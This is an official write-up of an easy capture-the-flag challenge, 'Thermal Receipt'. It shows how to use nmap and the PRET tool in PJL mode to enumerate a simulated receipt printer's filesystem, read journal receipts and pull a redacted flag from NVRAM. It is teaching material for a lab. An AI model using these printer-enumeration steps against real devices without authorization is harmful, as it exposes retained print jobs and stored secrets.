![img](../../assets/banner.png)

<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />        <font size="10">Thermal Receipt</font>

11<sup>th</sup> June 2026

Prepared By: Lean

Challenge Author(s): Lean

Difficulty: <font color=green>Easy</font>

Classification: Official

# [Synopsis](#synopsis)

Connect to PRET PJL mode, enumerate device files, recover the latest journal receipt, follow the NVRAM reference `ADDR=53264`, and read NVRAM to recover the flag.

## Description

Keir and his undercity runners recovered a forgotten Eastreach ration kiosk after Damas Marrowcairn sent clerks to strip the counting terminal and burn the paper ledger. They missed a small peripheral bolted beneath the counter. If the device still remembers the right transaction, it may hold the authorization token needed to move supplies through Crownspire sealed checkpoints.

## Skills Required

- Basic TCP service enumeration
- Basic familiarity with embedded peripheral interfaces
- Ability to use protocol-specific tooling
- Basic file and output inspection from an interactive tool

## Skills Learned

- Interacting with raw printer services
- Using PRET to enumerate a PJL-backed printer filesystem
- Recovering retained jobs from embedded peripheral storage
- Distinguishing print data from files retained by the device firmware

## Application Overview

From a black-box perspective the target exposes a single TCP service. It does not return an HTTP banner, and simple line-oriented interaction does not produce a useful shell or menu. The first task is to identify what kind of embedded peripheral is answering and choose tooling that can speak to it correctly.

Once the service is understood, the challenge becomes a device-enumeration problem rather than a web or memory-corruption problem. The target retains operational state from before the ledger was destroyed, but that state has to be discovered through the exposed peripheral interface.

The final objective is to recover the checkpoint authorization code by following the evidence the device exposes during normal protocol enumeration.

## Technology Background

### PJL in the Context of This Challenge

PJL is a printer job language commonly supported by network printers. It can expose device information, environment variables, status, and filesystem operations. In this challenge, the useful PJL command families are:

```text
@PJL INFO ID
@PJL INFO CONFIG
@PJL INFO VARIABLES
@PJL INFO FILESYS
@PJL FSDIRLIST NAME="0:/..." ENTRY=1 COUNT=65535
@PJL FSQUERY NAME="0:/..."
@PJL FSUPLOAD NAME="0:/..." OFFSET=0 SIZE=<n>
```

The service also supports the Universal Exit Language prefix and suffix used by printer tooling:

```text
\x1b%-12345X
```

That makes it compatible with PRET's PJL backend instead of requiring players to write a custom client.

References:

- https://github.com/RUB-NDS/PRET
- https://minisoft.com/support/wp-content/uploads/2018/11/PJL_Technical_Reference_Manual.pdf

### PRET Workflow

PRET provides a UNIX-like shell over printer languages. In PJL mode, commands such as `id`, `info`, `ls`, `cd`, `cat`, and `get` are translated into PJL requests and parsed back into a user-friendly form.

The expected connection command is:

```bash
python3 pret.py 127.0.0.1:9100 pjl
```

Once connected, the challenge should feel like browsing a small embedded filesystem rather than attacking a web service.

### Electronic Journal And NVRAM Workflow

Many POS deployments retain an electronic journal so receipts can be audited or reprinted later. This challenge models that behavior with a few closed jobs:

```text
0:/journal/receipt_0000.txt
0:/journal/receipt_0001.txt
0:/journal/receipt_0002.txt
0:/journal/receipt_0003.txt
0:/journal/last.txt
```

The latest closed receipt is `receipt_0003.txt`. It contains ESC/POS-style formatting bytes mixed with printable receipt text, so PRET's `cat` command is enough to reveal the recovery pointer.

The catch is that the latest receipt contains only an NVRAM pointer:

```text
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=27
```

PRET's PJL mode includes `nvram read <addr>`. The simulated printer returns both the numeric byte value and the ASCII mirror for the tagged journal-auth address, so one NVRAM read recovers the authorization code without custom scripting.

## Step-by-Step Attack Path

---

### Step 1 - Connect With PRET In PJL Mode

The target exposes only a raw printer socket. A normal HTTP request or telnet-style interaction does not produce a useful banner. The intended first action is to use PRET in PJL mode and let it initialize the printer session.

**Manual enumeration before connecting**

```bash
nmap -sT -sV -Pn -p 9100 127.0.0.1
```

Useful output:

```text
PORT     STATE SERVICE    VERSION
9100/tcp open  jetdirect?
```

This tells us to treat the service as a raw printer endpoint, not as HTTP, SSH, or a custom TCP menu.

**Shell command**

```bash
python3 pret.py 127.0.0.1:9100 pjl
```

Successful connection:

```text
Connection to 127.0.0.1:9100 established

127.0.0.1:9100:/> id
RiverGate RG-T80II Thermal Receipt Printer
```

This confirms that the printer responds to PJL `INFO ID` queries and that PRET can parse the responses.

### Step 2 - Enumerate Device Information

PRET's information commands expose the model, firmware, personality, and environment variables. The variables output reveals the retained-job pointer.

**Manual enumeration before browsing storage**

```text
id
info config
env
info filesys
```

Useful output:

```text
Connection to 127.0.0.1:9100 established

127.0.0.1:9100:/> id
RiverGate RG-T80II Thermal Receipt Printer
127.0.0.1:9100:/> info config
MODEL=RG-T80II
FIRMWARE=3.18
SERIALNUMBER=RGT80-042-9100
PERSONALITY=PJL,PCL,ESC/POS
EJOURNAL=ON
127.0.0.1:9100:/> env
LANG=PJL [2 RANGE]
RET=ON [2 RANGE]
EJOURNAL=ON [2 RANGE]
EJINDEX=NVRAM [READONLY]
127.0.0.1:9100:/> info filesys
VOLUME TYPE TOTAL FREE LOCATION
0: TYPE=DIR TOTAL=65536 FREE=49152 LOCATION=FLASH
```

The important observation is that the printer keeps its electronic-journal index in NVRAM. The filesystem still has to be browsed, but the final authorization code will not be in the journal file itself.

### Step 3 - Browse the PJL Filesystem

The root volume is small. Listing it reveals a configuration directory, a spool directory, a readme, and the journal directory.

**Manual enumeration before choosing a receipt**

```text
ls
cat config/device.txt
cd journal
ls
cat last.txt
```

Expected output:

```text
Connection to 127.0.0.1:9100 established

127.0.0.1:9100:/> ls
d        -   config
d        -   journal
-       97   readme.txt
d        -   spool
127.0.0.1:9100:/> cat config/device.txt
MODEL=RG-T80II
FW=3.18
CMDSET=PJL/PCL/ESC-POS
EJOURNAL=ON
LAST_CLOSED_SLOT=NVRAM:EJ_LAST
127.0.0.1:9100:/> cd journal
127.0.0.1:9100:/journal> ls
-       17   last.txt
-      191   receipt_0000.txt
-      192   receipt_0001.txt
-      195   receipt_0002.txt
-      241   receipt_0003.txt
127.0.0.1:9100:/journal> cat last.txt
receipt_0003.txt
```

This turns the problem into normal file recovery from the printer's embedded storage. The `last.txt` journal pointer confirms that `receipt_0003.txt` is the latest closed receipt instead of relying only on filename ordering.

### Step 4 - Recover the Latest Receipt

The latest closed receipt is `receipt_0003.txt`. PRET can either print it to the console with `cat` or save it locally with `get`.

**Manual enumeration before reading NVRAM**

```text
cat receipt_0003.txt
```

PRET prints ESC/POS control bytes around the receipt body. The printable receipt output is:

```text
127.0.0.1:9100:/journal> env
LANG=PJL [2 RANGE]
RET=ON [2 RANGE]
EJOURNAL=ON [2 RANGE]
EJINDEX=NVRAM [READONLY]
127.0.0.1:9100:/journal> cat receipt_0003.txt
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=27
------------------------------
```

The receipt confirms that the value we need was mirrored into NVRAM rather than retained in the journal file itself. The fields to carry forward are:

```text
ADDR=53264
LEN=27
```

### Step 5 - Read NVRAM With PRET

PRET has a built-in NVRAM helper for PJL-speaking printers. Use the address from the receipt.

**Manual enumeration before extracting the flag**

```text
env
cat receipt_0003.txt
```

Useful output:

```text
127.0.0.1:9100:/journal> cat receipt_0003.txt
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=27
------------------------------
```

The NVRAM index and receipt reference agree, so read the referenced address.

**PRET command**

```text
nvram read 53264
```

Successful output:

```text
127.0.0.1:9100:/journal> nvram read 53264
ADDRESS=53264 DATA=72
ASCII="HTB{REDACTED}"
```

This completes the intended path: the receipt gives the address context, and NVRAM contains the actual authorization code.
